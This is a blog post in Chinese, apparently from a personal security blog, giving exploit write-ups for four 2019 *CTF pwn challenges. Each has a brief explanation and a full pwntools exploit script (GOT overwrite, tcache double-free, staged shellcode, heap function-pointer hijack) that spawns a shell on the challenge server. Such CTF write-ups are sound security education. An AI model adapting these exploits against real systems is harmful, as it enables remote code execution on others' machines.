@@ -1,0 +1,381 @@
+<!DOCTYPE html>
+
+
+  <html class="light page-post">
+
+
+<head>
+  <meta charset="utf-8">
+  
+  <title>2019*CTF-PWN | V1NKe的心情垃圾桶</title>
+
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  
+    <meta name="keywords" content="PWN," />
+  
+
+  <meta name="description" content="PWN">
+<meta name="keywords" content="PWN">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2019*CTF-PWN">
+<meta property="og:url" content="http://yoursite.com/2019/05/19/2019*CTF-PWN/index.html">
+<meta property="og:site_name" content="V1NKe的心情垃圾桶">
+<meta property="og:description" content="PWN">
+<meta property="og:locale" content="default">
+<meta property="og:updated_time" content="2019-05-19T11:26:03.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="2019*CTF-PWN">
+<meta name="twitter:description" content="PWN">
+
+  
+
+  
+    <link rel="icon" href="/haimian.ico">
+  
+
+  <link href="/css/styles.css?v=c114cbe6" rel="stylesheet">
+
+
+  
+    <link rel="stylesheet" href="/css/personal-style.css">
+  
+
+  
+
+  
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "//hm.baidu.com/hm.js?57e94d016e201fba3603a8a2b0263af0";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+  
+  <script type="text/javascript">
+	(function(){
+	    var bp = document.createElement('script');
+	    var curProtocol = window.location.protocol.split(':')[0];
+	    if (curProtocol === 'https') {
+	        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
+	    }
+	    else {
+	        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+	    }
+	    var s = document.getElementsByTagName("script")[0];
+	    s.parentNode.insertBefore(bp, s);
+	})();
+  </script>
+
+
+
+  
+    <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+  
+
+  
+    <link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.3.0/css/font-awesome.min.css">
+  
+</head>
+
+<body>
+
+
+  
+    <span id="toolbox-mobile" class="toolbox-mobile">盒子</span>
+  
+
+  <div class="post-header CENTER">
+   
+  <div class="toolbox">
+    <a class="toolbox-entry" href="/">
+      <span class="toolbox-entry-text">盒子</span>
+      <i class="icon-angle-down"></i>
+      <i class="icon-home"></i>
+    </a>
+    <ul class="list-toolbox">
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/archives/"
+            rel="noopener noreferrer"
+            target="_self"
+            >
+            博客
+          </a>
+        </li>
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/tag/"
+            rel="noopener noreferrer"
+            target="_self"
+            >
+            标签
+          </a>
+        </li>
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/link/"
+            rel="noopener noreferrer"
+            target="_self"
+            >
+            友链
+          </a>
+        </li>
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/about/"
+            rel="noopener noreferrer"
+            target="_self"
+            >
+            关于
+          </a>
+        </li>
+      
+    </ul>
+  </div>
+
+
+</div>
+
+
+  <div id="toc" class="toc-article">
+    <strong class="toc-title">文章目录</strong>
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言："><span class="toc-text">前言：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#正文："><span class="toc-text">正文：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#quicksort："><span class="toc-text">quicksort：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#EXP："><span class="toc-text">EXP：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#girlfriend："><span class="toc-text">girlfriend：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#EXP：-1"><span class="toc-text">EXP：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#babyshell："><span class="toc-text">babyshell：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#EXP：-2"><span class="toc-text">EXP：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#upxofcpp："><span class="toc-text">upxofcpp：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#EXP：-3"><span class="toc-text">EXP：</span></a></li></ol></li></ol></li></ol>
+  </div>
+
+
+
+<div class="content content-post CENTER">
+   <article id="post-2019*CTF-PWN" class="article article-type-post" itemprop="blogPost">
+  <header class="article-header">
+    <h1 class="post-title">2019*CTF-PWN</h1>
+
+    <div class="article-meta">
+      <span>
+        <i class="icon-calendar"></i>
+        <span>2019.05.19</span>
+      </span>
+
+      
+        <span class="article-author">
+          <i class="icon-user"></i>
+          <span>V1NKe</span>
+        </span>
+      
+
+      
+
+
+      
+
+      
+      <i class="fa fa-eye"></i> 
+        <span id="busuanzi_container_page_pv">
+           &nbsp热度 <span id="busuanzi_value_page_pv">
+           <i class="fa fa-spinner fa-spin"></i></span>℃
+        </span>
+      
+      
+    </div>
+  </header>
+
+  <div class="article-content">
+    
+      <h2 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h2><p>大概是最后几篇writeup了，整理完之后就专心搞浏览器了，今天整理下来发现自己做的，和待做的题都很多。感受到了这两年自己的锻炼还是有的。当然了，我不可能一直玩着ctf，该舍弃的还是得舍弃的，虽然确实很舍不得，舍不得比赛的一些有趣的事和人。还是得脱离这个舒适区去真实的锻炼自己的。那么现在也就差不多了。</p>
+<h2 id="正文："><a href="#正文：" class="headerlink" title="正文："></a>正文：</h2><p>就不细写了，粗略的写一下*CTF的题目，有一道细写了一下，那道题对我来说收获其实还蛮多的。</p>
+<h3 id="quicksort："><a href="#quicksort：" class="headerlink" title="quicksort："></a>quicksort：</h3><p>有一块任意写。</p>
+<ol>
+<li>先把<code>free@got</code>修改为<code>main</code>，无限执行。</li>
+<li>再泄漏出<code>got</code>表上的地址。</li>
+<li>修改<code>malloc</code>为<code>system</code>。</li>
+</ol>
+<h4 id="EXP："><a href="#EXP：" class="headerlink" title="EXP："></a>EXP：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">#p = process(&apos;./quicksort&apos;)</span><br><span class="line">p = remote(&apos;34.92.96.238&apos;,10000)</span><br><span class="line">elf = ELF(&apos;./quicksort&apos;)</span><br><span class="line">libc = ELF(&apos;./libc.so.6&apos;)</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line"></span><br><span class="line">free_got = 0x804A018</span><br><span class="line">main_addr = 0x8048816</span><br><span class="line">stack_check_addr = 0x804A024</span><br><span class="line">ret_addr = 0x080484ae</span><br><span class="line">malloc_addr = 0x804A028</span><br><span class="line"></span><br><span class="line">p.recvuntil(&apos;how many numbers do you want to sort?\n&apos;)</span><br><span class="line">p.sendline(&apos;1&apos;)</span><br><span class="line">p.recvuntil(&apos;the 1th number:&apos;)</span><br><span class="line">payload = str(main_addr) + &apos;\x00&apos;</span><br><span class="line">payload += &apos;A&apos;*(16-len(payload)) + p32(1) + p32(0)*2</span><br><span class="line">payload += p32(free_got)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(&apos;how many numbers do you want to sort?\n&apos;)</span><br><span class="line">p.sendline(&apos;3&apos;)</span><br><span class="line">p.recvuntil(&apos;the 1th number:&apos;)</span><br><span class="line">payload2 = str(ret_addr) + &apos;\x00&apos;</span><br><span class="line">payload2 += &apos;A&apos;*(16-len(payload2)) + p32(3) + p32(2)*2</span><br><span class="line">payload2 += p32(stack_check_addr-8)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line"></span><br><span class="line">p.recvuntil(&apos;Here is the result:\n-&apos;)</span><br><span class="line">data = p.recv(9)</span><br><span class="line">data = int(data,10)</span><br><span class="line">getchar_addr = 0x100000000 - data</span><br><span class="line">libc_base = getchar_addr - libc.symbols[&apos;getchar&apos;]</span><br><span class="line">system_addr = libc_base + libc.symbols[&apos;system&apos;]</span><br><span class="line">bin_addr = libc_base + libc.search(&apos;/bin/sh&apos;).next()</span><br><span class="line">print hex(libc_base),hex(bin_addr)</span><br><span class="line"></span><br><span class="line">p.recvuntil(&apos;how many numbers do you want to sort?\n&apos;)</span><br><span class="line">p.sendline(&apos;1&apos;)</span><br><span class="line">p.recvuntil(&apos;the 1th number:&apos;)</span><br><span class="line">system_addr = 0x100000000 - system_addr</span><br><span class="line">payload3 = &apos;-&apos; + str(system_addr) + &apos;\x00&apos;</span><br><span class="line">payload3 += &apos;A&apos;*(16-len(payload3)) + p32(1) + p32(0)*2</span><br><span class="line">payload3 += p32(malloc_addr)</span><br><span class="line">p.sendline(payload3)</span><br><span class="line"></span><br><span class="line">p.recvuntil(&apos;how many numbers do you want to sort?\n&apos;)</span><br><span class="line">#gdb.attach(p)</span><br><span class="line">p.sendline(&apos;-&apos;+str((0x100000000 - bin_addr)/4 - 1))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line">#*CTF&#123;lSkR5u3LUh8qTbaCINgrjdJ74iE9WsDX&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="girlfriend："><a href="#girlfriend：" class="headerlink" title="girlfriend："></a>girlfriend：</h3><p>带<code>tcache</code>的蛮简单一道题。</p>
+<h4 id="EXP：-1"><a href="#EXP：-1" class="headerlink" title="EXP："></a>EXP：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p = process(&apos;./chall&apos;)</span><br><span class="line">#p = remote(&apos;34.92.96.238&apos;,10001)</span><br><span class="line">elf = ELF(&apos;./chall&apos;)</span><br><span class="line">libc = ELF(&apos;./libc.so.6&apos;)</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line"></span><br><span class="line">def add(size,name,call):</span><br><span class="line">    p.recvuntil(&apos;choice:&apos;)</span><br><span class="line">    p.sendline(&apos;1&apos;)</span><br><span class="line">    p.recvuntil(&apos;name&apos;)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.recvuntil(&apos;name:&apos;)</span><br><span class="line">    p.send(name)</span><br><span class="line">    p.recvuntil(&apos;call:&apos;)</span><br><span class="line">    p.send(call)</span><br><span class="line"></span><br><span class="line">def show(idx):</span><br><span class="line">    p.recvuntil(&apos;choice:&apos;)</span><br><span class="line">    p.sendline(&apos;2&apos;)</span><br><span class="line">    p.recvuntil(&apos;index:&apos;)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">def delete(idx):</span><br><span class="line">    p.recvuntil(&apos;choice:&apos;)</span><br><span class="line">    p.sendline(&apos;4&apos;)</span><br><span class="line">    p.recvuntil(&apos;index:&apos;)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">for i in range(10):</span><br><span class="line">    add(0x90,&apos;A&apos;*0x90,&apos;A&apos;)</span><br><span class="line">for i in range(7):</span><br><span class="line">    delete(i)</span><br><span class="line">delete(8)</span><br><span class="line">show(8)</span><br><span class="line">p.recvuntil(&apos;name:\n&apos;)</span><br><span class="line">data = u64(p.recv(6).ljust(8,&apos;\x00&apos;))</span><br><span class="line">libc_base = data - 4111520</span><br><span class="line">system_addr = libc_base + libc.symbols[&apos;system&apos;]</span><br><span class="line">malloc_addr = libc_base + libc.symbols[&apos;__malloc_hook&apos;]</span><br><span class="line">print hex(libc_base)+&apos;,&apos;+hex(malloc_addr)</span><br><span class="line"></span><br><span class="line">add(0x90,&apos;A&apos;*0x90,&apos;A&apos;)</span><br><span class="line">for i in range(10):</span><br><span class="line">    add(0x60,&apos;A&apos;*0x60,&apos;A&apos;)</span><br><span class="line">for i in range(7):</span><br><span class="line">    delete(i+11)</span><br><span class="line">delete(18)</span><br><span class="line">delete(19)</span><br><span class="line">delete(18)</span><br><span class="line"></span><br><span class="line">for i in range(7):</span><br><span class="line">    add(0x60,&apos;A&apos;*0x60,&apos;A&apos;)</span><br><span class="line"></span><br><span class="line">add(0x60,p64(malloc_addr),&apos;A&apos;)</span><br><span class="line">add(0x60,&apos;A&apos;*0x60,&apos;A&apos;)</span><br><span class="line">add(0x60,&apos;A&apos;*0x60,&apos;A&apos;)</span><br><span class="line">add(0x60,p64(system_addr),&apos;A&apos;)</span><br><span class="line"></span><br><span class="line">gdb.attach(p)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h3 id="babyshell："><a href="#babyshell：" class="headerlink" title="babyshell："></a>babyshell：</h3><p>调用<code>syscall</code>用<code>read</code>即可。简单的<code>shellcode</code>编写：</p>
+<h4 id="EXP：-2"><a href="#EXP：-2" class="headerlink" title="EXP："></a>EXP：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">#p = process(&apos;./shellcode&apos;)</span><br><span class="line">p = remote(&apos;34.92.37.22&apos;,10002)</span><br><span class="line">context.arch = &apos;amd64&apos;</span><br><span class="line">context.os = &apos;Linux&apos;</span><br><span class="line"></span><br><span class="line">p.recvuntil(&apos;give me shellcode, plz:\n&apos;)</span><br><span class="line"></span><br><span class="line">payload = asm(&apos;&apos;&apos;</span><br><span class="line">                 pop rdx</span><br><span class="line">                 pop rdx</span><br><span class="line">                 pop rdx</span><br><span class="line">                 pop rdx</span><br><span class="line">                 pop rdi</span><br><span class="line">                 pop rdi</span><br><span class="line">                 syscall</span><br><span class="line">              &apos;&apos;&apos;</span><br><span class="line">             )</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">payload2 = asm(shellcraft.sh())</span><br><span class="line">#gdb.attach(p)</span><br><span class="line">p.sendline(&apos;A&apos;*len(payload) + payload2)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line">#*CTF&#123;LtMh5VbedHlngmKOS2cwWRo4AkDGzCBy&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="upxofcpp："><a href="#upxofcpp：" class="headerlink" title="upxofcpp："></a>upxofcpp：</h3><p>这里就用了一个upx加壳的特性，加壳之后有很大一块面积是可执行的。而且一些不加壳的保护也会被加壳改变。所以需要用加壳的elf去调试。</p>
+<p>node结构体中存在指向函数调用的<code>func_table</code>,通过构造使得<code>func_table</code>指到堆，使得<code>*func_table</code>的show函数指向堆上，在show函数指向的堆上构造shellcode。</p>
+<h4 id="EXP：-3"><a href="#EXP：-3" class="headerlink" title="EXP："></a>EXP：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p = process(&apos;./upx&apos;)</span><br><span class="line">#p = remote(&apos;34.92.121.149&apos;,10000)</span><br><span class="line">elf = ELF(&apos;./upx&apos;)</span><br><span class="line">libc = ELF(&apos;./libc-2.23.so&apos;)</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line"></span><br><span class="line">def add(index,size,integer):</span><br><span class="line">    p.sendlineafter(&apos;Your choice:&apos;,&apos;1&apos;)</span><br><span class="line">    p.sendlineafter(&apos;Index:&apos;,str(index))</span><br><span class="line">    p.sendlineafter(&apos;Size:&apos;,str(size))</span><br><span class="line">    p.sendlineafter(&apos;integers, -1 to stop:&apos;,str(integer))</span><br><span class="line">    p.sendline(&apos;-1&apos;)</span><br><span class="line"></span><br><span class="line">def delete(index):</span><br><span class="line">    p.sendlineafter(&apos;Your choice:&apos;,&apos;2&apos;)</span><br><span class="line">    p.sendlineafter(&apos;vec index:&apos;,str(index))</span><br><span class="line"></span><br><span class="line">def show(index):</span><br><span class="line">    p.sendlineafter(&apos;Your choice:&apos;,&apos;4&apos;)</span><br><span class="line">    p.sendlineafter(&apos;vec index:&apos;,str(index))</span><br><span class="line"></span><br><span class="line">add(0,0x40/4,1)</span><br><span class="line">add(1,0x20/4,2)</span><br><span class="line">add(2,0x1000/4,3)</span><br><span class="line">delete(1)</span><br><span class="line">delete(0)</span><br><span class="line">delete(2)</span><br><span class="line">p.sendlineafter(&apos;Your choice:&apos;,&apos;1&apos;)</span><br><span class="line">p.sendlineafter(&apos;Index:&apos;,str(3))</span><br><span class="line">p.sendlineafter(&apos;Size:&apos;,str(0x68/4))</span><br><span class="line"></span><br><span class="line">payload = &apos;-&apos;+str(0x47b79796)</span><br><span class="line">p.sendlineafter(&apos;integers, -1 to stop:&apos;,payload)</span><br><span class="line">p.sendline(str(0x6e69622f))</span><br><span class="line">p.sendline(str(0x732f2f2f))</span><br><span class="line">p.sendline(&apos;-&apos;+str(0x1876b7b0))</span><br><span class="line">p.sendline(str(0x01697268))</span><br><span class="line">p.sendline(str(0x24348101))</span><br><span class="line">p.sendline(str(0x01010101))</span><br><span class="line">p.sendline(str(0x6a56f631))</span><br><span class="line">p.sendline(str(0x01485e08))</span><br><span class="line">p.sendline(&apos;-&apos;+str(0x76b7a91a))</span><br><span class="line">p.sendline(str(0x6ad231e6))</span><br><span class="line">p.sendline(str(0x050f583b))</span><br><span class="line">p.sendline(str(1))</span><br><span class="line">p.sendline(str(1))</span><br><span class="line">p.sendline(str(1))</span><br><span class="line">p.sendline(str(1))</span><br><span class="line">p.sendline(str(1))</span><br><span class="line">p.sendline(str(1))</span><br><span class="line">p.sendline(str(1))</span><br><span class="line">p.sendline(str(1))</span><br><span class="line">p.sendline(str(1))</span><br><span class="line">p.sendline(str(1))</span><br><span class="line">p.sendline(str(1))</span><br><span class="line">p.sendline(str(1))</span><br><span class="line">p.sendline(str(40683))</span><br><span class="line">p.sendline(str(-1))</span><br><span class="line"></span><br><span class="line">#gdb.attach(p)</span><br><span class="line"></span><br><span class="line">show(1)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+    
+  </div>
+
+  
+      <div class="git"></div>
+  
+
+</article>
+
+
+   
+  <div class="text-center donation">
+    <div class="inner-donation">
+      <span class="btn-donation">支持一下</span>
+      <div class="donation-body">
+        <div class="tip text-center">扫一扫，支持v1nke</div>
+        <ul>
+        
+          <li class="item">
+            <span>微信扫一扫</span>
+            <img src="/images/qr-wechat.jpeg" alt="">
+          </li>
+        
+          <li class="item">
+            <span>支付宝扫一扫</span>
+            <img src="/images/qr-wechat.jpeg" alt="">
+          </li>
+        
+        </ul>
+      </div>
+    </div>
+  </div>
+
+
+   
+  <div class="box-prev-next clearfix">
+    <a class="show pull-left" href="/2019/04/24/2019-CISCN-PWN/">
+        <i class="icon icon-angle-left"></i>
+    </a>
+    <a class="show pull-right" href="/2098/03/08/yzq&lmq/">
+        <i class="icon icon-angle-right"></i>
+    </a>
+  </div>
+
+
+
+
+</div>
+
+
+  <a id="backTop" class="back-top">
+    <i class="icon-angle-up"></i>
+  </a>
+
+
+
+
+  <div class="modal" id="modal">
+  <span id="cover" class="cover hide"></span>
+  <div id="modal-dialog" class="modal-dialog hide-dialog">
+    <div class="modal-header">
+      <span id="close" class="btn-close">关闭</span>
+    </div>
+    <hr>
+    <div class="modal-body">
+      <ul class="list-toolbox">
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/archives/"
+              rel="noopener noreferrer"
+              target="_self"
+              >
+              博客
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/tag/"
+              rel="noopener noreferrer"
+              target="_self"
+              >
+              标签
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/link/"
+              rel="noopener noreferrer"
+              target="_self"
+              >
+              友链
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/about/"
+              rel="noopener noreferrer"
+              target="_self"
+              >
+              关于
+            </a>
+          </li>
+        
+      </ul>
+
+    </div>
+  </div>
+</div>
+
+
+
+  
+      <div class="fexo-comments comments-post">
+    
+
+    
+
+    
+    
+
+    
+
+    
+    
+
+  </div>
+
+  
+
+  <script type="text/javascript">
+  function loadScript(url, callback) {
+    var script = document.createElement('script')
+    script.type = 'text/javascript';
+
+    if (script.readyState) { //IE
+      script.onreadystatechange = function() {
+        if (script.readyState == 'loaded' ||
+          script.readyState == 'complete') {
+          script.onreadystatechange = null;
+          callback();
+        }
+      };
+    } else { //Others
+      script.onload = function() {
+        callback();
+      };
+    }
+
+    script.src = url;
+    document.getElementsByTagName('head')[0].appendChild(script);
+  }
+
+  window.onload = function() {
+    loadScript('/js/bundle.js?235683', function() {
+      // load success
+    });
+  }
+</script>
+
+</body>
+</html>
